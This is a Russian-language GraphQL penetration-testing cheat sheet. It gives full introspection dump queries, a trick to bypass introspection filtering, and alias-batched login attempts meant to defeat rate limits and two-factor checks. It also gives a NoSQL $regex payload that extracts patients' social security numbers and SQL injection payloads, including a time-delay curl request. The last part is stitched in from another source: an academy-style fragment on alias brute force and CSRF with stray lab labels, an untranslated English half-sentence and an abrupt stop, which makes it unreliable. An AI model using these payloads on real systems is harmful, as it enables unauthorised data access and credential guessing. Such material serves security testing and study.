> GraphQL — это язык запросов для API и среда выполнения для выполнения этих запросов с использованием существующих данных, предназначенный для обеспечения эффективного взаимодействия между клиентами и серверами. Он позволяет пользователю точно указать, какие данные он хочет получить в ответе, что помогает избежать больших объектов ответа и множественных вызовов, которые иногда встречаются в REST API.
>> Обычно возникают из-за ошибок реализации и проектирования. Например, функция интроспекции может быть оставлена активной, что позволяет пользователю отправлять запросы к API для получения информации о его схеме.


* [Инструменты](#инструменты)
* [Немного базы](#Немного-базы)
* [Перечисление](#перечисление)
    * [Распространенные конечные точки GraphQL](#распространенные-конечные-точки-graphql)
    * [Идентификация точки внедрения](#идентификация-точки-внедрения)
    * [Методы запроса](#Методы-запроса)
    * [Начальное тестирование](#Начальное-тестирование)
    * [Перечисление схемы базы данных через интроспекцию](#перечисление-схемы-базы-данных-через-интроспекцию)
       * [Обход защиты от интроспекции GraphQL](#Обход-защиты-от-интроспекции-GraphQL) 
    * [Перечисление схемы базы данных через подсказки](#перечисление-схемы-базы-данных-через-подсказки)
    * [Перечисление определений типов](#перечисление-определений-типов)
    * [Список путей для достижения типа](#список-путей-для-достижения-типа)
* [Методология](#методология)
    * [Извлечение данных](#извлечение-данных)
    * [Извлечение данных с использованием Edges/Nodes](#извлечение-данных-с-использованием-edgesnodes)
    * [Извлечение данных с использованием проекций](#извлечение-данных-с-использованием-проекций)
    * [Мутации](#мутации)
    * [Атаки пакетной обработки GraphQL](#атаки-пакетной-обработки-graphql)
        * [Пакетная обработка на основе списка JSON](#пакетная-обработка-на-основе-списка-json)
        * [Пакетная обработка на основе имени запроса](#пакетная-обработка-на-основе-имени-запроса)
* [Injection](#Injection)
    * [NoSQL Injection](#NoSQLi)
    * [SQL Injection](#SQLi)

# Инструменты
*   [graphql wordlists](https://github.com/Escape-Technologies/graphql-wordlist/tree/main/wordlists)
*   [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Скриптовый движок для взаимодействия с graphql endpoint в целях тестирования на проникновение.
*   [doyensec/graph-ql](https://github.com/doyensec/graph-ql) - Материалы для исследования безопасности GraphQL.
*   [doyensec/inql](https://github.com/doyensec/inql) - Расширение Burp для тестирования безопасности GraphQL.
*   [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - анализирует схему интроспекции GraphQL и генерирует возможные запросы.
*   [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Перечисляет различные способы достижения заданного типа в схеме GraphQL.
*   [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - Расширенная IDE для исследования GraphQL API.
*   [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Получение схемы GraphQL API, несмотря на отключенную интроспекцию.
*   [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - Утилита для перебора паролей и фаззинга GraphQL.
*   [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - Фреймворк угроз GraphQL, используемый специалистами по безопасности для исследования пробелов в безопасности в реализациях GraphQL.
*   [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Утилита для аудита безопасности GraphQL API.
*   [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - Утилита для определения движка сервера GraphQL.
*   [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Представляет любой GraphQL API в виде интерактивного графа.
*   [Insomnia](https://insomnia.rest/) - Кроссплатформенный HTTP и GraphQL клиент.
*   [Graphql visualizer](http://nathanrandal.com/graphql-visualizer/) - Это онлайн-инструмент, который берет результаты запроса интроспекции и создает визуальное представление возвращенных данных, включая отношения между операциями и типами.

# Немного базы

> Все операции GraphQL используют одну и ту же конечную точку (endpoint) и обычно отправляются как POST-запрос. Это существенно отличается от REST API, которые используют специфичные для операции конечные точки и различные HTTP-методы. В GraphQL тип и имя операции определяют, как обрабатывается запрос, а не конечная точка, на которую он отправлен, или используемый HTTP-метод.

**Данные, описываемые схемой GraphQL, можно манипулировать с помощью трех типов операций:**

* **Запросы (Queries)** получают данные.(аналог GET в REST API)
* **Мутации (Mutations)** добавляют, изменяют или удаляют данные.(POST,PUT и DELETE в REST API)
   * Поля (Fields)
   * Аргументы — это значения, предоставляемые для конкретных полей. Аргументы, которые может принимать тип, определяются в схеме.
   * Переменные (Variables) - позволяют передавать динамические аргументы, вместо того чтобы указывать аргументы непосредственно в самом запросе.
   * Псевдонимы (Aliases)
   * Фрагменты (Fragments) — это переиспользуемые части запросов или мутаций. Они содержат подмножество полей, принадлежащих связанному типу. 
* **Подписки (Subscriptions)** похожи на запросы, но устанавливают постоянное соединение, через которое сервер может активно передавать данные клиенту в указанном формате.(Websocket)

* **GraphQL Операции и Примеры**

| Тип операции | Назначение | Пример запроса | Пример переменных | Ответ сервера |
|--------------|------------|----------------|-------------------|---------------|
| **Query** | Получение данных (аналог GET) | `query GetUser { user(id: "1") { name email } }` | `{}` | `{ "data": { "user": { "name": "Alice", "email": "alice@example.com" } } }` |
| **Query с аргументами** | Получение данных с фильтрацией | `query GetUsers($limit: Int!) { users(limit: $limit) { id name } }` | `{ "limit": 5 }` | `{ "data": { "users": [{ "id": "1", "name": "Alice" }] } }` |
| **Query с псевдонимами** | Переименование полей в ответе | `query { author: user(id: "1") { fullName: name } admin: user(id: "2") { fullName: name } }` | `{}` | `{ "data": { "author": { "fullName": "Alice" }, "admin": { "fullName": "Bob" } } }` |
| **Query с фрагментами** | Переиспользуемые наборы полей | `query { user1: user(id: "1") { ...UserFields } user2: user(id: "2") { ...UserFields } } fragment UserFields on User { name email createdAt }` | `{}` | `{ "data": { "user1": { "name": "Alice", "email": "alice@example.com", "createdAt": "2023-01-01" }, "user2": { "name": "Bob", "email": "bob@example.com", "createdAt": "2023-01-02" } } }` |
| **Query с переменными** | Динамические параметры запроса | `query GetUserWithPosts($userId: ID!, $includePosts: Boolean!) { user(id: $userId) { name email posts @include(if: $includePosts) { title } } }` | `{ "userId": "1", "includePosts": true }` | `{ "data": { "user": { "name": "Alice", "email": "alice@example.com", "posts": [{ "title": "My Post" }] } } }` |
| **Query с директивой @include** | Условное включение полей | `query User($id: ID!, $withPosts: Boolean!) { user(id: $id) { name email posts @include(if: $withPosts) { title } } }` | `{ "id": "1", "withPosts": false }` | `{ "data": { "user": { "name": "Alice", "email": "alice@example.com" } } }` |
| **Query с директивой @skip** | Условное пропуск полей | `query User($id: ID!, $skipEmail: Boolean!) { user(id: $id) { name email @skip(if: $skipEmail) } }` | `{ "id": "1", "skipEmail": true }` | `{ "data": { "user": { "name": "Alice" } } }` |
| **Mutation** | Создание данных (аналог POST) | `mutation CreateUser($input: UserInput!) { createUser(input: $input) { id name email } }` | `{ "input": { "name": "Charlie", "email": "charlie@example.com" } }` | `{ "data": { "createUser": { "id": "3", "name": "Charlie", "email": "charlie@example.com" } } }` |
| **Mutation** | Обновление данных (аналог PUT) | `mutation UpdateUser($id: ID!, $input: UserInput!) { updateUser(id: $id, input: $input) { id name email } }` | `{ "id": "1", "input": { "name": "Alice Smith" } }` | `{ "data": { "updateUser": { "id": "1", "name": "Alice Smith", "email": "alice@example.com" } } }` |
| **Mutation** | Удаление данных (аналог DELETE) | `mutation DeleteUser($id: ID!) { deleteUser(id: $id) { success message } }` | `{ "id": "1" }` | `{ "data": { "deleteUser": { "success": true, "message": "User deleted" } } }` |
| **Mutation с несколькими операциями** | Атомарные изменения | `mutation UpdateProfile($userInput: UserInput!, $profileInput: ProfileInput!) { updateUser(input: $userInput) { name } updateProfile(input: $profileInput) { bio } }` | `{ "userInput": { "name": "Alice" }, "profileInput": { "bio": "Developer" } }` | `{ "data": { "updateUser": { "name": "Alice" }, "updateProfile": { "bio": "Developer" } } }` |
| **Subscription** | Реальное время (WebSocket) | `subscription OnNewMessage { newMessage { id content author { name } } }` | `{}` | Постоянный поток данных при новых сообщениях |
| **Subscription с переменными** | Фильтрация событий | `subscription OnUserMessages($userId: ID!) { newMessage(userId: $userId) { id content } }` | `{ "userId": "1" }` | Поток данных только для указанного пользователя |
| **Inline Fragment** | Условные поля для интерфейсов | `query Search($query: String!) { search(query: $query) { ... on User { name email } ... on Post { title content } } }` | `{ "query": "Alice" }` | `{ "data": { "search": [{ "name": "Alice", "email": "alice@example.com" }] } }` |

* **GraphQL Директивы**

| Директива | Назначение | Пример | Результат |
|-----------|------------|--------|-----------|
| **@include** | Включить поле если условие true | `{ user { name email @include(if: $withEmail) } }` | Если `$withEmail = true` - вернет name и email, если `false` - только name |
| **@skip** | Пропустить поле если условие true | `{ user { name email @skip(if: $withoutEmail) } }` | Если `$withoutEmail = true` - вернет только name, если `false` - name и email |
| **@deprecated** | Помечает поле как устаревшее | `{ user { oldField @deprecated(reason: "Use newField") } }` | Используется в схеме, предупреждает клиентов |

* **GraphQL Типы данных**

| Тип | Пример | Описание |
|-----|--------|-----------|
| **Scalar Types** | | Базовые типы данных |
| `String` | `"Hello"` | Текстовая строка |
| `Int` | `42` | Целое число |
| `Float` | `3.14` | Число с плавающей точкой |
| `Boolean` | `true` | Логическое значение |
| `ID` | `"user_123"` | Уникальный идентификатор |
| **Input Types** | | Типы для входных данных |
| `input UserInput` | `{ name: "Alice", email: "alice@example.com" }` | Сложный тип для мутаций |
| **Object Types** | | Типы для возвращаемых данных |
| `type User` | `{ id: "1", name: "Alice" }` | Объект с полями |
| **Enum Types** | | Перечисляемые значения |
| `enum Role` | `ADMIN, USER, GUEST` | Фиксированный набор значений |
| **List Types** | | Массивы значений |
| `[String]` | `["a", "b", "c"]` | Список строк |
| **NonNull Types** | | Обязательные поля |
| `String!` | Обязательная строка | Не может быть null |

> **Интроспекция(Introspection)** — это встроенная функция GraphQL, которая позволяет запрашивать у сервера информацию о схеме. Она обычно используется такими приложениями, как GraphQL IDE и инструменты генерации документации.

| Назначение | Запрос | Описание | Пример ответа |
|------------|--------|----------|---------------|
| **Получить все типы** | `{ __schema { types { name kind } } }` | Получает все типы в схеме с их видом (OBJECT, SCALAR, etc.) | `{ "data": { "__schema": { "types": [ { "name": "User", "kind": "OBJECT" }, { "name": "String", "kind": "SCALAR" } ] } } }` |
| **Получить конкретный тип** | `{ __type(name: "User") { name fields { name type { name } } } }` | Получает информацию о конкретном типе и его полях | `{ "data": { "__type": { "name": "User", "fields": [ { "name": "id", "type": { "name": "ID" } }, { "name": "name", "type": { "name": "String" } } ] } } }` |
| **Получить все queries** | `{ __schema { queryType { fields { name description args { name type { name } } } } } }` | Получает все доступные запросы и их аргументы | `{ "data": { "__schema": { "queryType": { "fields": [ { "name": "user", "description": "Get user by ID", "args": [ { "name": "id", "type": { "name": "ID" } } ] } ] } } } }` |
| **Полуть все mutations** | `{ __schema { mutationType { fields { name description args { name type { name } } } } } }` | Получает все доступные мутации и их аргументы | `{ "data": { "__schema": { "mutationType": { "fields": [ { "name": "createUser", "description": "Create new user", "args": [ { "name": "input", "type": { "name": "UserInput" } } ] } ] } } } }` |
| **Получить все subscriptions** | `{ __schema { subscriptionType { fields { name description } } } }` | Получает все доступные подписки | `{ "data": { "__schema": { "subscriptionType": { "fields": [ { "name": "onMessage", "description": "Subscribe to new messages" } ] } } } }` |
| **Получить директивы** | `{ __schema { directives { name description locations } } }` | Получает все доступные директивы | `{ "data": { "__schema": { "directives": [ { "name": "deprecated", "description": "Marks field as deprecated", "locations": ["FIELD_DEFINITION"] } ] } } }` |
| **Получить enum значения** | `{ __type(name: "UserRole") { name enumValues { name description } } }` | Получает значения enum типа | `{ "data": { "__type": { "name": "UserRole", "enumValues": [ { "name": "ADMIN", "description": "Administrator role" }, { "name": "USER", "description": "Regular user" } ] } } }` |
| **Получить информацию о поле** | `{ __type(name: "User") { name fields { name description type { name kind ofType { name } } } } }` | Получает детальную информацию о полях типа | `{ "data": { "__type": { "name": "User", "fields": [ { "name": "posts", "description": "User's posts", "type": { "name": null, "kind": "LIST", "ofType": { "name": "Post" } } } ] } } }` |
| **Проверить deprecated поля** | `{ __type(name: "User") { name fields { name isDeprecated deprecationReason } } }` | Находит устаревшие поля и причину устаревания | `{ "data": { "__type": { "name": "User", "fields": [ { "name": "oldField", "isDeprecated": true, "deprecationReason": "Use newField instead" } ] } } }` |
| **Получить всю схему** | `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }` | Полный запрос интроспекции для получения всей схемы | Полная схема GraphQL в структурированном виде |

Сервисы GraphQL обычно отвечают на операции объектом JSON в запрошенной структуре.

> Большинство определяемых типов — это объектные типы, которые определяют доступные объекты, их поля и аргументы. Каждое поле имеет свой собственный тип, который может быть другим объектом или скалярным типом, перечислением (enum), объединением (union), интерфейсом (interface) или пользовательским типом.

* В приведенном ниже примере показано простое определение схемы для типа `Product`. Оператор `!` указывает, что поле является обязательным (non-nullable) при вызове.

```graphql
# Пример определения схемы
type Product {
    id: ID!
    name: String!
    description: String!
    price: Int
}
```

# Перечисление

## Распространенные конечные точки GraphQL

Чаще всего GraphQL находится по конечной точке `/graphql` или `/graphiql`. Более полный список доступен в [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt).

```js
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
/api
/api/graphql
/graphql/api
/graphql/graphql
```


## Идентификация точки внедрения

```query{__typename}```

> Запрос работает, потому что каждая конечная точка GraphQL имеет зарезервированное поле __typename, которое возвращает тип запрошенного объекта в виде строки.

```url
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
example.com/api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

Проверьте, видны ли ошибки.
```url
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

## Методы запроса

> Наилучшей практикой для производственных конечных точек GraphQL является принимать только POST-запросы с content-type, равным application/json, так как это помогает защититься от уязвимостей CSRF. Однако некоторые конечные точки могут принимать альтернативные методы, такие как GET-запросы или POST-запросы, использующие content-type x-www-form-urlencoded.

## Начальное тестирование

> Если API использует аргументы для прямого доступа к объектам, он может быть уязвим для уязвимостей контроля доступа. Пользователь потенциально может получить доступ к информации, к которой у него не должно быть доступа, просто предоставив аргумент, соответствующий этой информации.

## Перечисление схемы базы данных через интроспекцию

* Запрос проверки интроспекции
```python
{
    "query": "{__schema{queryType{name}}}"
}
```
* URL-кодированный запрос для дампа схемы базы данных.

```python
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

* Декодированный URL запрос для дампа схемы базы данных.

```graphql
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```
* Однострочные запросы для дампа схемы базы данных без фрагментов.
```python
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```


```python
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

* Обнаружение информации о схеме
```python
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
            }
            onOperation  # Часто требуется удалить для выполнения запроса
            onFragment   # Часто требуется удалить для выполнения запроса
            onField      # Часто требуется удалить для выполнения запроса
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```
> Если интроспекция включена, но приведенный выше запрос не выполняется, попробуйте удалить директивы onOperation, onFragment и onField из структуры запроса. Многие конечные точки не принимают эти директивы как часть запроса интроспекции, и вы часто можете добиться большего успеха с интроспекцией, удалив их.

* Burp (set interseption query)
```python
{"query":"query IntrospectionQuery {\n    __schema {\n        queryType {\n            name\n        }\n        mutationType {\n            name\n        }\n        subscriptionType {\n            name\n        }\n        types {\n            ...FullType\n        }\n        directives {\n            name\n            description\n            locations\n            args {\n                ...InputValue\n            }\n        }\n    }\n}\n\nfragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n        name\n        description\n        args {\n            ...InputValue\n        }\n        type {\n            ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n    }\n    inputFields {\n        ...InputValue\n    }\n    interfaces {\n        ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n    }\n    possibleTypes {\n        ...TypeRef\n    }\n}\n\nfragment InputValue on __InputValue {\n    name\n    description\n    type {\n        ...TypeRef\n    }\n    defaultValue\n}\n\nfragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n        kind\n        name\n        ofType {\n            kind\n            name\n            ofType {\n                kind\n                name\n            }\n        }\n    }\n}"}
```

### Обход защиты от интроспекции GraphQL

> Когда разработчики отключают интроспекцию, они могут использовать регулярное выражение для исключения ключевого слова __schema в запросах. Можно попробовать такие символы, как пробелы, новые строки и запятые, поскольку они игнорируются GraphQL, но не flawed regex. ```%0a```

Таким образом, если разработчик исключил только __schema{, то приведенный ниже запрос интроспекции не будет исключен.
```graphql
{
    "query": "query{__schema
    {queryType{name}}}"
}
```
Если это не сработает, попробуй запустить проверку с использованием альтернативного метода запроса, поскольку интроспекция может быть отключена только для POST. 

* [Попробуйте GET-запрос или POST-запрос с content-type x-www-form-urlencoded.](#Идентификация-точки-внедрения)


## Перечисление схемы базы данных через подсказки

Когда используешь неизвестное ключевое слово, бэкенд GraphQL ответит подсказкой, связанной с его схемой.
```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```
Вы также можно попробовать подобрать известные ключевые слова, имена полей и типов с использованием словарей, таких как [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist/tree/main/wordlists), когда схема GraphQL API недоступна.

## Перечисление определений типов

Перечислите определение интересующих типов, используя следующий запрос GraphQL, заменив "User" на выбранный тип.
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```
## Список путей для достижения типа
```python
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

# Методология

## Извлечение данных
```pyhton
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

HTB Help - GraphQL injection

## Извлечение данных с использованием Edges/Nodes
```graphql
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
}
```
## Извлечение данных с использованием проекций

⚠️ Не забудьте экранировать " внутри options.

```graphql
{
  doctors(options: "{\"patients.ssn\" :1}") {
    firstName
    lastName
    id
    patients {
      ssn
    }
  }
}
```

## Мутации

Мутации работают как функции, вы можете использовать их для взаимодействия с GraphQL.
```python
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

## Атаки пакетной обработки GraphQL

Распространенные сценарии:

* Усиление атаки перебора паролей
* Обход ограничения скорости (Rate Limit)
* Обход двухфакторной аутентификации (2FA)

### Пакетная обработка на основе списка JSON

> Пакетная обработка запросов (Query batching) — это функция GraphQL, которая позволяет отправлять несколько запросов на сервер в одном HTTP-запросе. Вместо отправки каждого запроса в отдельном запросе клиент может отправить массив запросов в одном POST-запросе на сервер GraphQL. Это уменьшает количество HTTP-запросов и может повысить производительность приложения.

Пакетная обработка запросов работает путем определения массива операций в теле запроса. Каждая операция может иметь свой собственный запрос, переменные и имя операции. Сервер обрабатывает каждую операцию в массиве и возвращает массив ответов, по одному для каждого запроса в пакете.

```graphql
[
    {
        "query":"..."
    },
    {
        "query":"..."
    },
    {
        "query":"..."
    },
    {
        "query":"..."
    }
    ...
]
```
### Пакетная обработка на основе имени запроса
```graphql
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```
Отправьте одну и ту же мутацию несколько раз, используя псевдонимы (aliases).
```graphql
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```
# Injection

> Внедрения SQL и NoSQL все еще возможны, поскольку GraphQL — это всего лишь слой между клиентом и базой данных.

## NoSQLi

Используйте $regex внутри параметра поиска.
```graphql
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}",
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }"
  ) {
    firstName
    lastName
    id
    patients {
      ssn
    }
  }
}
```

## SQLi

Отправьте одинарную кавычку ' внутри параметра GraphQL, чтобы вызвать SQL-инъекцию.
```graphql
{
  bacon(id: "1'") {
    id
    type
    price
  }
}
```
Простая SQL-инъекция внутри поля GraphQL.
```bash
curl -X POST "http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27"
```








































Обход ограничения скорости с использованием псевдонимов

Обычно объекты GraphQL не могут содержать несколько свойств с одинаковым именем. Псевдонимы позволяют обойти это ограничение, явно называя свойства, которые вы хотите вернуть из API. Вы можете использовать псевдонимы для возврата нескольких экземпляров одного и того же типа объекта в одном запросе.
Дополнительная информация

Для получения дополнительной информации о псевдонимах GraphQL см. раздел «Псевдонимы».

Хотя псевдонимы предназначены для ограничения количества необходимых вызовов API, их также можно использовать для перебора конечной точки GraphQL.

Многие конечные точки имеют какой-либо ограничитель скорости (rate limiter), чтобы предотвратить атаки перебором. Некоторые ограничители скорости работают на основе количества полученных HTTP-запросов, а не количества операций, выполненных с конечной точкой. Поскольку псевдонимы фактически позволяют отправлять несколько запросов в одном HTTP-сообщении, они могут обойти это ограничение.

Упрощенный пример ниже показывает серию запросов с псевдонимами, проверяющих, действительны ли скидочные коды магазина. Эта операция потенциально может обойти ограничение скорости, поскольку это один HTTP-запрос, даже though it could potentially be used to check a vast number of discount codes at once.
graphql

# Запрос с псевдонимами
query isValidDiscount($code: Int) {
    isValidDiscount(code:$code){
        valid
    }
    isValidDiscount2: isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3: isValidDiscount(code:$code){
        valid
    }
}

text

ЛАБОРАТОРНАЯ
PRACTITIONER
Обход защит от перебора GraphQL
Не решена

# CSRF в GraphQL

Уязвимости межсайтовой подделки запроса (CSRF) позволяют злоумышленнику побудить пользователей выполнить действия, которые они не собирались выполнять. Это делается путем создания вредоносного веб-сайта, который подделывает межсайтовый запрос к уязвимому приложению.
Дополнительная информация

Для получения общей информации об уязвимостях CSRF см. раздел академии по CSRF.

GraphQL можно использовать в качестве вектора для CSRF-атак, когда злоумышленник создает эксплойт, вызывающий отправку браузером жертвы вредоносного запроса от имени пользователя-жертвы.
Как возникают уязвимости CSRF в GraphQL?

Уязвимости CSRF могут возникать, когда конечная точка GraphQL не проверяет тип содержимого (content-type) отправляемых ей запросов и не реализованы CSRF-токены.

